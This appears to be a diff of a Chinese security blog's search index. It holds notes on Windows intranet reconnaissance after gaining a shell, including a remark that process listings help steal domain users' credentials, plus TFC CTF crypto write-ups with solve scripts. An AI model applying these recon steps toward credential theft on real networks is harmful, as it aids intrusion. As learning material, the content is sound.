+<p>对攻击的分析表明，研究人员能够将此次黑客攻击与先前相似规模的针对XSS漏洞的同一威胁行动联系起来。先前的活动是使用20000个不同的IP地址进行的，而此次新的活动也使用了相同的IP地址。而且，所有攻击都针对过时的插件或主题较旧漏洞，攻击者可以利用这些漏洞下载文件或导出。</p>
+<h2 id="li-yong-icmp-xie-yi-fan-dan-shell"><a href="#利用icmp协议反弹shell" class="headerlink" title="利用icmp协议反弹shell"></a>利用icmp协议反弹shell<a href="#li-yong-icmp-xie-yi-fan-dan-shell" class="header-anchor">#</a></h2><h2 id="nei-wang-xin-xi-sou-ji"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集<a href="#nei-wang-xin-xi-sou-ji" class="header-anchor">#</a></h2><h3 id="windows-gong-zuo-zu"><a href="#Windows（工作组）" class="headerlink" title="Windows（工作组）"></a>Windows（工作组）<a href="#windows-gong-zuo-zu" class="header-anchor">#</a></h3><h4 id="cha-kan-dang-qian-shell-quan-xian"><a href="#查看当前shell权限" class="headerlink" title="查看当前shell权限"></a>查看当前shell权限<a href="#cha-kan-dang-qian-shell-quan-xian" class="header-anchor">#</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /user &amp;&amp; whoami /priv</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\mirror\AppData\Roaming\Typora\typora-user-images\image-20220803103606793.png" alt="image-20220803103606793"></p>
+<h4 id="cha-kan-xi-tong-xin-xi"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息<a href="#cha-kan-xi-tong-xin-xi" class="header-anchor">#</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">主机名 -&gt; 扮演的角色</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\mirror\AppData\Roaming\Typora\typora-user-images\image-20220803103811404.png" alt="image-20220803103811404"></p>
+<h4 id="cha-kan-tcp-udp-wang-luo-lian-jie-zhuang-tai"><a href="#查看tcp-udp-网络连接状态" class="headerlink" title="查看tcp/udp 网络连接状态"></a>查看tcp/udp 网络连接状态<a href="#cha-kan-tcp-udp-wang-luo-lian-jie-zhuang-tai" class="header-anchor">#</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+<p>可以获取内网IP分布状态、服务。</p>
+<p><code>LISTENING</code>：表示监听中，这个端口正在开放，可以提供服务。</p>
+<p><code>CLOSING</code>：表示关闭的，表示端口处于关闭状态</p>
+<p><code>TIME_WAIT</code>：表示正在等待连接，就是你正在向该端口发送请求连接状态</p>
+<p><code>ESTABLISHED</code>：表示是对方与你已经连接，正在通信交换数据</p>
+<h4 id="cha-kan-ji-qi-ming"><a href="#查看机器名：" class="headerlink" title="查看机器名："></a>查看机器名：<a href="#cha-kan-ji-qi-ming" class="header-anchor">#</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\mirror\AppData\Roaming\Typora\typora-user-images\image-20220803104234364.png" alt="image-20220803104234364"></p>
+<h4 id="cha-kan-wang-luo-pei-zhi"><a href="#查看网络配置" class="headerlink" title="查看网络配置"></a>查看网络配置<a href="#cha-kan-wang-luo-pei-zhi" class="header-anchor">#</a></h4><p>有Primary Dns Suffix（主DNS后缀）就说明是域内，空则当前机器应该在工作组</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig/all</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\mirror\AppData\Roaming\Typora\typora-user-images\image-20220803104517510.png" alt="image-20220803104517510"></p>
+<h4 id="cha-kan-jin-cheng"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程<a href="#cha-kan-jin-cheng" class="header-anchor">#</a></h4><p>有些进程可能是域用户启的-&gt;通过管理员权限-窃取凭证-&gt;窃取域用户的凭证</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure>
+]]></content>
       <tags>
         <tag>Web</tag>
       </tags>
@@ -2906,18 +2938,18 @@
   <entry>
     <title>TFC_CTF</title>
     <url>/2022/07/29/TFC-CTF/</url>
-    <content><![CDATA[<p>同样总体难度不大，但是挺好玩的0_0</p>
+    <content><![CDATA[<!--toc-->
+<p>同样总体难度不大，但是挺好玩的0_0</p>
 <span id="more"></span>
-<!--toc-->
-<h2><span id="basic">BASIC</span><a href="#basic" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/Rn/X7n<span class="comment">#bUc.rjzh,|eEsg,?&amp;QI;@^ARm&#125;UKOkICi#X.ixEmN]D</span></span><br></pre></td></tr></table></figure>
+<h2 id="basic"><a href="#BASIC" class="headerlink" title="BASIC"></a>BASIC<a href="#basic" class="header-anchor">#</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/Rn/X7n<span class="comment">#bUc.rjzh,|eEsg,?&amp;QI;@^ARm&#125;UKOkICi#X.ixEmN]D</span></span><br></pre></td></tr></table></figure>
 <p>base91拿flag</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">TFCCTF&#123;sh3<span class="string">&#x27;s_4_10..._but_0n_th3_ph_sc4l3&#125;</span></span><br></pre></td></tr></table></figure>
-<h2><span id="obscure">OBSCURE</span><a href="#obscure" class="header-anchor">#</a></h2><p>太离谱了，这不是crypto。。。</p>
+<h2 id="obscure"><a href="#OBSCURE" class="headerlink" title="OBSCURE"></a>OBSCURE<a href="#obscure" class="header-anchor">#</a></h2><p>太离谱了，这不是crypto。。。</p>
 <p>放在记事本里面放大看就可以</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T̶̨̧͈͍̥͚̭̜͇̻̥̘̹̝̩͍̦̜͕͉̥̳͑̎͋͊͛͗̆͐̄͂̀̒͛̉̿̏̈̕̚̚̕͝͝͝ͅF̶̡̛̛͖̝̹̹͔̟̝̟̠̩̲̱͉̻̭̻̮͓̲̮͈̜̅̔̈͐̀̾̋͊̈́͛͆̿̀̓͐̓͋̃͛̃́̑̀̽͂̋̌̐̎̕̕͘͝͠͝͝ͅC̵̢̨̨͓̞̥̠̲̗̝̯̥̥͚̙̰̣̼̻̤̳͓͙̺̤͊̍͊̌̍̎̀̅̽͊͘͘͘͜͝͠͝͝ͅÇ̶̼̫͎̬̰͓̰̭̺̼̥̮͖͗̾͐́̉͂͂͗̏̿̂̀͝͝Ṭ̷̛͓̑̓̓̒́̋̒̃̋͊̑̎͐͐̋̈̆̉́̀̏͑̀̾̎͒̾̉̃̄̊͂́͐̈́͘͘͜͝͝F̴̢̨̡̛̥̠̪̤̞͔̝̞̳̱̙̰̲̙̠̬̻̥̜͔̲̯͚̳̖̩̺͈̬͍̪̥̯͙̱͙͔̞̰̮̦̼̼͐͒͆̿̓̓͑̎͊̋͂͑̅̈́͗̃͆͊̓̆̈́͂́̆͌͂̈̔́̔̎̀̾̕̕̚͝͝͝͝͠ͅ&#123;̴̧̡̡̛͈̻̥̙̯̜͓̥̣͔̣͐̄̂̋͋̏͋̌̍̔̀̎̿̍̈́̐̏͒̓̒̉̐́̓̓̽̕̕͝͠s̴̝̬͒̾͗̌̓͊̚ͅ3̷̢̧͓̬̳̯̜̦͉̜̗͚̗̳̩̻͉͍̼͓͍̼͚̝͔͙̗̞͎͚̼͈̹̞͋̉̆̈́͊̐̓̔͋̈͂́̔̈́͒͗̀́̂̏͒͜͝ç̷̛͉͔̮̯̳͚̘̜͇̗͖̟̫̇͋̇̑͆̀͊̈̌̅̀̿̓͊̓̀̉́̀̓̋̊͐͊̒̌͒͒̈́̒̅̀̽̾͗̾͌̃̉̾̚̚̕̕͝͝ư̵̼̑̔͌̉͆͒̅͗̆̑̌̀̀͗̒̾̎͆̇̄̃̀̒̉̂͂̀̍̃̄̈͐̈́̔̔̈́̽̚͘̕͘ͅr̵̛̼͊̽̔̋͠1̶̧̡̨̡̢̧̡̛̗̼͓̣͖̖̖̫̲̻̰͇̫̘̖̞͖̬̤͔̙̠̪̦͙̮̝̫͔͕͈̗̙͇̫̩̫͔̩͂̾͆̈́̂̌͋̕͜͜ͅͅṭ̶̡̢̢̧̨̡̡̨̧̨̛͔̜̳̥̤̰̖̩̟̬̰̖̥̹̼͈̦̥̣͇̭͎̻̻͔̪͍̻̜͎͉͙͇̣̿̑̂̈́̇̉̄͑̅͂͐̒̽́̀̏̓̂͑͐͌̈̂̔͑̐͆̐̏͆́́̾̑̈́͑͌͐̓̊̕̚͘͜ͅẙ̸̢̨̛̹̻͉͇͎̭̻̙̭͔͎̺̤̤̻͓̼̮͈̤͈͈̠̞̪̠͉̗̺̟̙͈̖̲̪̫̖͔̟̟̇̇̿̎̊̀̊̔͌̀̀͒͐͋̀̍̃͒̂̈́͆͋̍͐̑̀̓̿̓̈́͑̊̇͆̿̓͐̓̉̕͘̕̕̚͜͠͝_̷̡̡̨̡̛̛̗̩͔̫̗̭̟̣̗͙͇͇̩̣̼̟̱͖̯̥͎̽͋́̽̈́̎͗̿͊͗͂̒̓͑͛̾̄̿͛̄͛͛́͌͐̀t̷̢̛̰̟̹͖̪̝͕̭̩͚̬̙̃͐̎͐͂͒͆̒̔̊̀͛̂̿̑̀̇͊͋̇̌̅͛̀͂͋̿̈́̈́̽̍̕͝͠͝ḩ̶̢̡̡̛̺͈̺̙͚̪͕͚̹̺̥͚̦͚̺̯̬̣͚͕͔̖̝̞̖͔̙͉͔̟̼͕͖̙̐̃͋̈͛̽́̔̈͐́́̒̏̂̄̊̔̿̍̀̓̅̽̆̍̐̌̈́̋̈́̀̿̓̐́̐͌̓͘̚͘͜͠͝͠͝ͅr̸̢̡͙̼̜̬̤̗̯̪͇̩͓͕͓͓̝͇͖̎͂̏͆͝ͅ0̷̨̛̛̛̛̯̖̞̮̦̞̫̜͕̱̻̞͎̯͎̮͑̿͆̀͛̔͆̈́̈̆̑̄̅͂̇̄́̀́̒̋̇̓̍̀̈́̂̈́̀̀̂̅̅̑́͌̋̈́͘̕̕̕̚͝ų̶̧̡̢̖͓̲̞̭̗̦̠̹̥̙̱̙̥̯̗̭̩͙͔̜̙̼̻̼̞͛̂͆̀̾̃̈́͑̈́̔̈́̾̉̄̌͗̀͊̔̈́̌́͜͠͝͠g̷̢̨̡̜̩̘̺͎̮̻̼͙̱̱͈̣̳̣̻̜͒̓͗̍͌̈́͌̉͑̽̕͝͝ͅh̸̛̛͓̯̣̼̫̦̐͗̀̾̉̅̑́͌̈́͌́͑̔̈́̇̄͘̕͝͝_̶̭̹̩̳̯͙̯͕͔̼̔̈͑̉͗͌̚͜͝0̵̢̧̛͎̭̣͈̼̳͍͚͖̲͚̗̮͖̲̼͍̼̮̖̩͖̫͔̱͓̥̯̹̥͎͖̳͈̻̝̬̪̙̪̩̬̀̉̽̂̑̓̓͐̂̐̉͆̇́̂͌̈́̏͆͗̒̋̅̋̚̕͜͜͜͝͠ͅḇ̵̨̡̨͍͖͔͚̰̠͚͇̤̝̦̺͎͙̱̭̥̼̹̞͓̜̙͕͕͚͍̩͈̭̱͖̍̌̇͆̄̏̃͌͆͛̑̀͑̂̅̍̔̐̾̽̓̑̈̇͑̃̉̎͂̐̅̆́͐̿͌͗̕͘̚̕͘̕̚͘͜͝͝͝ͅͅs̸̡̨̯̬̰̠̖̟̹͈̞͎͉͉͓̠̺̹̣̲̺̬̜̝͓͓̰͍̖̹̮̹̩̥̆̾̐͘ͅç̷̡̩͍̥̘̳̺͎͉͓͖̭̝̖̹̬̗̞̲̞̬̹̼̱̫͓͙̤̤̖̦͕͓̱̝̯͇̼͚͕̳̿͆̀͒͊̎̅͐̂͗̾̀͊͑͊́̊̈͒͂̾́͂̓̓̀̏͋͂̿̆̀͒̇̚͘͝͝ͅü̶̧̨̡̲̩̥͇̘͇̣͕̞̗͓̳̗͉̲͔̻̪̪͕̖͈̪̳̤̤͈̫̹͉̞̝͖͎͕̥̻̣̖̼̰̣̰̦̈̂̿̉̋̂̔̎̓͂̎̍̾̉͂̆̈͌̐͆̓̊͋͑͒̚͜͜͠͝͠͝͝ͅr̵̨̢̨̡̡͓̭͍̲̗͍̼̬̰̗̱̩̼̰̤͓̞̤͔͇͎̪̱̱̺͈̭͆͜ͅ1̶̡̧̨̛͕̟̹͚̹̫̮̖͚̯̲̰̤̙͉͌͆̈́̽̀͗̿̓̑͒̄̌̓̓̓͗̇̒̃̑̏̊͑̋̅̎̔͂͑̔͑̈̄̉̚͘͝ṭ̶̡̼̲͓̺̝̱̮͈̱͈͔̞̙͚̝̬̳͑͌͆̀̆̄͆̀͌͐̂̽̓̾͂̀́͗͗̍͒̆̏̓͌͒͌́̒̑̐́̃͘͝͝ẏ̸̨̡̨̞̰̜̜̟̦͎̣͍͎̳̝̮̼̦͚̮̖͈̺͓̮̲̤͙̞͕̰͖̩̭̮̯̆̌̊́̀̈́̈́̓̈́͛̌̈́́̄͋̍̇̍͌͑̃̀̈̐̋̄̐̈́̉͌̀̀̀͑̏͐̄́̿̅̽͊̉͘͘͜͝͝͠ͅͅ&#125;̴̨̧̡̨̛̛̞̝̼̫͈̝̞̣̣͈̥̫͙̻͓̯̮̻͇̤̦̼͍̱̥̞̥͔̙̹̲͈̲̥̤͚͚͕̺̫̗͍͖͎̆͗̍̈͠ͅͅ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TFCCTF&#123;s3cur1ty_thr0ugh_0bscur1ty&#125;</span><br></pre></td></tr></table></figure>
-<h2><span id="mafioso">MAFIOSO</span><a href="#mafioso" class="header-anchor">#</a></h2><p>尝试直接转bytes但是得到了没有意义的字符串，随后观察密文的长度可以发现是64位，猜测是sha256的哈希。送到网站解拿到flag</p>
-<h2><span id="exclusive-oracle">EXCLUSIVE ORACLE</span><a href="#exclusive-oracle" class="header-anchor">#</a></h2><p>迷茫。</p>
-<h2><span id="train-to-paddington">TRAIN TO PADDINGTON</span><a href="#train-to-paddington" class="header-anchor">#</a></h2><p>第一步将flag进行pad_pt</p>
+<h2 id="mafioso"><a href="#MAFIOSO" class="headerlink" title="MAFIOSO"></a>MAFIOSO<a href="#mafioso" class="header-anchor">#</a></h2><p>尝试直接转bytes但是得到了没有意义的字符串，随后观察密文的长度可以发现是64位，猜测是sha256的哈希。送到网站解拿到flag</p>
+<h2 id="exclusive-oracle"><a href="#EXCLUSIVE-ORACLE" class="headerlink" title="EXCLUSIVE ORACLE"></a>EXCLUSIVE ORACLE<a href="#exclusive-oracle" class="header-anchor">#</a></h2><p>迷茫。</p>
+<h2 id="train-to-paddington"><a href="#TRAIN-TO-PADDINGTON" class="headerlink" title="TRAIN TO PADDINGTON"></a>TRAIN TO PADDINGTON<a href="#train-to-paddington" class="header-anchor">#</a></h2><p>第一步将flag进行pad_pt</p>
 <p>第二步生成一个16字节的密钥</p>
 <p>第三步进行分组加密，具体操作是将pad后的flag跟key进行分组异或，随后按照大端字节序转成bytes，将这个过程得到的bytes拼接起来得到一个密文。最后告诉我们密文的十六进制值。</p>
 <p>不难发现这其实相当于一个ECB模式的分组加密。同一个密钥key被用来加密多个明文分组。</p>
@@ -2928,16 +2960,21 @@
 <p>从最后一个恢复出的部分明文可以知道<code>4t10n&#125;</code>后面全是填充字符加密而来，所以我们可以知道key的第7个到第16个字节，再结合我们已知知道的前7个，成功恢复key。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;b4b55c3ee34fac488ebeda573ab1f974bf9b2b0ee865e45a92d2f14b7bdabb6ed4872e4dd974e803d9b2ba1c77baf725&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">f = <span class="string">b&#x27;TFCCTF&#123;&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(f)</span><br><span class="line">tmp_key = <span class="string">b&#x27;\xe0\xf3\x1f&#125;\xb7\t\xd7&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(tmp_key)</span><br><span class="line">pad = <span class="string">b&#x27;\x3f&#x27;</span></span><br><span class="line">h_p = <span class="string">b&#x27;\x03\xd9\xb2\xba\x1cw\xba\xf7%&#x27;</span></span><br><span class="line">key1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> h_p:</span><br><span class="line">    key1+= (<span class="built_in">ord</span>(pad)^ i ).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="comment">#print(key1)</span></span><br><span class="line">key = tmp_key + key1</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key)==<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    flag += (key[j]^c[i]).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">    j%=<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>做完才发现题目很细心的在两个交界处加了一个问号</p>
-<h2><span id="admin-panel">ADMIN PANEL</span><a href="#admin-panel" class="header-anchor">#</a></h2><p>​    读题之后发现是输入正确的密码就可以获取flag。</p>
+<h2 id="admin-panel"><a href="#ADMIN-PANEL" class="headerlink" title="ADMIN PANEL"></a>ADMIN PANEL<a href="#admin-panel" class="header-anchor">#</a></h2><p>​    读题之后发现是输入正确的密码就可以获取flag。</p>
 <p>选项2提供了一个改密的功能，在这里有一个关键点就是我们可以修改密码，并且修改的密码我们可以想办法获得。</p>
 <p>我们先输入一个长为64的十六进制token，然后服务器那边会随机生成一个字节，然后跟我们发送的token进行异或。</p>
 <p>最后的异或值经过decrypt函数就是修改后的PASSWD,这里只需要注意如果我们发送token为全0，然后这个token只跟一个字节异或然后送去decrypt，这就导致b的值固定不变。</p>
 <p>所以我们的操作就是发个token过去，然后本地爆破出256个可能的b，然后向服务器请求256个可能的decrypt(xorred)</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">KEY = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">byte, bytes_second</span>):</span><br><span class="line">    d = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bytes_second)):</span><br><span class="line">        d += <span class="built_in">bytes</span>([byte ^ bytes_second[i]])</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    iv = ciphertext[:<span class="number">16</span>]</span><br><span class="line">    ct = ciphertext[<span class="number">16</span>:]</span><br><span class="line">    <span class="comment">#pt = b&#x27;&#x27;</span></span><br><span class="line">    state = iv</span><br><span class="line">    M = []</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        pt = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ct)):</span><br><span class="line">            c = b ^ ct[i]</span><br><span class="line">            pt += <span class="built_in">bytes</span>([c])</span><br><span class="line">            state = state[<span class="number">1</span>:] + <span class="built_in">bytes</span>([ct[i]])</span><br><span class="line">        M.append(pt)</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;00&#x27;</span>*<span class="number">32</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">hex_token = <span class="built_in">bytes</span>.fromhex(a)</span><br><span class="line">ip = <span class="string">&quot;01.linux.challenges.ctf.thefewchosen.com&quot;</span></span><br><span class="line">port = <span class="number">54089</span></span><br><span class="line">r = remote(ip,port)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Token &gt; &quot;</span>)</span><br><span class="line">r.sendline(a.encode())</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;XORing with: &quot;</span>)</span><br><span class="line">r_byte = r.recvline()</span><br><span class="line">r_byte = r_byte.replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#print(xor)</span></span><br><span class="line"><span class="comment">#r.sendline(b&#x27;1&#x27;)</span></span><br><span class="line">r_byte = r_byte.decode()</span><br><span class="line"><span class="comment">#print(&#x27;r_byte=&#x27;,r_byte)</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(r_byte)</span><br><span class="line">xorred = xor(c[<span class="number">0</span>], hex_token)</span><br><span class="line">M = decrypt(xorred)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> M:</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.recv())</span><br><span class="line">    m = i.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(m.encode())</span><br><span class="line">    r.sendline(m.encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h2><span id="admin-panel-harder">ADMIN PANEL HARDER</span><a href="#admin-panel-harder" class="header-anchor">#</a></h2><p>随机生成的密钥是32个字节了，这就使得我们可以控制的state无法保持一个值不变。题目变得困难起来</p>
+<h2 id="admin-panel-harder"><a href="#ADMIN-PANEL-HARDER" class="headerlink" title="ADMIN PANEL HARDER"></a>ADMIN PANEL HARDER<a href="#admin-panel-harder" class="header-anchor">#</a></h2><p>随机生成的密钥是32个字节了，这就使得我们可以控制的state无法保持一个值不变。题目变得困难起来</p>
 ]]></content>
       <tags>
         <tag>Crypto</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Shanks&#39;s_babystep-giantstep</title>
+    <url>/2022/08/03/Shanks-s-babystep-giantstep/</url>
+    <content><![CDATA[]]></content>
   </entry>
 </search>
